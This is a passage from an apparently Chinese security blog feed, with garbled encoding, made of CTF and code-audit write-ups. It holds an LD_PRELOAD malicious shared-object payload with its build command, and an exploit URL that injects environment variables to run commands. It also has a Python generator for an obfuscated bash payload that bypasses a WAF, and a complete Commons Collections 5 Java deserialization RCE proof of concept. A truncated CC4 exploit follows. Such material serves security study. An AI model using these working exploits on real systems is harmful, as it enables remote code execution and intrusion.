<span class="string">&quot;?&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> c &#123;</span><br><span class="line"><span class="keyword">for</span> _, b := <span class="keyword">range</span> blacklist &#123;</span><br><span class="line"><span class="keyword">if</span> b == <span class="type">string</span>(s) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> unicode.IsLetter(s) &#123;</span><br><span class="line"><span class="keyword">if</span> t == s &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> t == <span class="number">0</span> &#123;</span><br><span class="line">t = s</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶ä¼šåŠ è½½ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥è®©å…¶åŠ è½½æ¶æ„çš„ so æ–‡ä»¶æ¥ rce</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;stdlib.h&gt;</span></span><br><span class="line">__attribute__((constructor)) void l3yx()&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(getenv(&quot;_evilcmd&quot;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gcc -shared -fPIC -o evil.so evil.c</span><br></pre></td></tr></table></figure><p>å¤§è‡´æ€è·¯ï¼š<br>é€šè¿‡ä¸Šä¼ æ¶æ„çš„ so æ–‡ä»¶æ¥ rceï¼Œå…ˆè®¿é—® /token è·å–åˆ° token çš„å€¼ï¼Œå› ä¸ºåé¢ä¼šæœ‰æ£€éªŒï¼Œupload ä¼šå°†å…¶ç§»åŠ¨åˆ° token ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¼šå‘ç°å…¶è¯·æ±‚ <code>/token?http_proxy=127.0.0.1:8080</code>  è·å–åˆ° tokenï¼Œä¹Ÿå°±æ˜¯ proxy ä»£ç†å®ç°ã€‚å†å» curl å†…ç½‘çš„ 9091manage æ¥å£ï¼Œå°† m å‚æ•°ä¼ å…¥å³å¯å¾—åˆ° flagï¼Œå½“ç„¶è¿˜è¦å…ˆç»•è¿‡ waf</p><p><img src="https://img-blog.csdnimg.cn/fca4867e50aa417c80b2b2c2f8ec07d5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/token?http_proxy=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span>&amp;LD_PRELOAD=/code/uploads/<span class="number">2</span>ea6a3a71d0b2db658544f67f1468897/XVlBz&amp;_evilcmd=ls /</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">n = <span class="built_in">dict</span>()</span><br><span class="line">n[<span class="number">0</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">n[<span class="number">1</span>] = <span class="string">&#x27;$&#123;##&#125;&#x27;</span></span><br><span class="line">n[<span class="number">2</span>] = <span class="string">&#x27;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))&#x27;</span></span><br><span class="line">n[<span class="number">3</span>] = <span class="string">&#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;))&#x27;</span></span><br><span class="line">n[<span class="number">4</span>] = <span class="string">&#x27;$(($&#123;##&#125;&lt;&lt;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))))&#x27;</span></span><br><span class="line">n[<span class="number">5</span>] = <span class="string">&#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;))&#x27;</span></span><br><span class="line">n[<span class="number">6</span>] = <span class="string">&#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;0))&#x27;</span></span><br><span class="line">n[<span class="number">7</span>] = <span class="string">&#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))&#x27;</span></span><br><span class="line"></span><br><span class="line">f=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_oct</span>(<span class="params">cmd</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> cmd:</span><br><span class="line">        o = (<span class="string">&#x27;%s&#x27;</span> % (<span class="built_in">oct</span>(<span class="built_in">ord</span>(t))))[<span class="number">2</span>:]</span><br><span class="line">        s+=<span class="string">&#x27;\\&#x27;</span>+o</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">cmd</span>):</span><br><span class="line">    payload = <span class="string">&quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\&#x27;&quot;</span></span><br><span class="line">    s = str_to_oct(cmd).split(<span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        payload+=<span class="string">&quot;\\\\&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> _:</span><br><span class="line">            payload+=n[<span class="built_in">int</span>(i)]</span><br><span class="line">    <span class="keyword">return</span> payload+<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(quote(<span class="string">&quot;123;&quot;</span>+build(<span class="string">&quot;cat /flag&quot;</span>))))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d8ce9214a7694fe094dc9bc2f912e15a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;é™„ä»¶&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#é™„ä»¶&quot;&gt;#&lt;/a&gt; é™„ä»¶&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/d6b8b5877a73434ebaa441197c5894ca.</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Go" scheme="https://ki10moc.github.io/tags/Go/"/>
    
  </entry>
  
  <entry>
    <title>Commons Collections5</title>
    <link href="https://ki10moc.github.io/2022/08/21/Commons%20Collections5/"/>
    <id>https://ki10moc.github.io/2022/08/21/Commons%20Collections5/</id>
    <published>2022-08-20T17:37:36.000Z</published>
    <updated>2022-08-24T05:09:50.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ç¯å¢ƒ"><a class="markdownIt-Anchor" href="#ç¯å¢ƒ">#</a> ç¯å¢ƒ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¾ç„¶æ˜¯ cc1 çš„å˜å½¢</p><h3 id="å®¡è®¡"><a class="markdownIt-Anchor" href="#å®¡è®¡">#</a> å®¡è®¡</h3><p>ç›´æ¥æ¥çœ‹ <code>Map</code>  çš„ <code>get()</code>  æ–¹æ³•</p><p><code>TideMapEntry</code>  ä¸­çš„ <code>getValue()</code>  ä¸­æœ‰è°ƒç”¨ <code>get()</code>  æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¹¶åœ¨ <code>toString()</code>  æ–¹æ³•ä¸­è°ƒç”¨ <code>getvalue()</code> <br> å…³äºè¿™ä¸ª <code>toString()</code>  å°è±¡å¾ˆæ·±<br>æºè‡ªæŸ CTF é¢˜ç›®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>map</code>  å±æ€§æ˜¯é€šè¿‡ <code>TideMapEntry</code>  æ¥æ„é€ èµ‹å€¼çš„ï¼Œä¹Ÿå°±æ˜¯å°† <code>cc1</code>  ä¸­ <code>LazyMap</code>  æ¢åš <code>TideMapEntry</code>  æ¥æ„é€ å±æ€§</p><p>ä¸‹é¢å°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªé‡å†™çš„ <code>readObject</code>  æ–¹æ³•å¹¶ä¸”å¯ä»¥è°ƒç”¨ <code>toString</code>  çš„æ–¹æ³•</p><p><code>BadAttributeValueExpException0</code>  çš„ <code>readObject()</code>  æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line"><span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">val = valObj.toString();</span><br></pre></td></tr></table></figure><p>åªè¦è®© <code>valObj</code>  æ˜¯ <code>TiedMapEntry</code>  ç±»çš„å¯¹è±¡å³å¯</p><p>åˆ©ç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>ç›´æ¥å¯¹ç…§ç€å½“æ—¶çš„ <code>cc1</code>  æŠŠåé¢çš„ <code>AnnotationInvocationHandler</code>  æ¢æˆ <code>BadAttributeValueExpException</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125; ;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;ki10Moc&quot;</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span>clazz.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(o);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/aeee5214c63148d0b23079a0a0ed4b8c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ç¯å¢ƒ&quot;&gt;#&lt;/a&gt; ç¯å¢ƒ&lt;/h3&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Javaå®‰å…¨" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Commons Collections4</title>
    <link href="https://ki10moc.github.io/2022/08/10/Commons%20Collections4/"/>
    <id>https://ki10moc.github.io/2022/08/10/Commons%20Collections4/</id>
    <published>2022-08-09T17:37:36.000Z</published>
    <updated>2023-08-22T20:05:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>ç›¸è¾ƒäºå‰é¢çš„ cc é“¾ï¼Œå¤šçš„æ˜¯ä¸€ä¸ªç‰ˆæœ¬çš„æ›´æ–°</p><p>ä¹‹å‰éƒ½æ˜¯ 3.2.1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">         &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">         &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p><code>cc4</code>  æ˜¯ <code>cc3</code>  å’Œ <code>cc2</code>  çš„ç»„åˆ</p><p>é‚£å‰é¢çš„å‰ç½®çŸ¥è¯†å°±ä¸åšä»‹ç»äº†</p><p>pocï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main.java;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc4</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesclass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">//nameå­—æ®µ</span></span><br><span class="line">        <span class="type">Field</span> <span 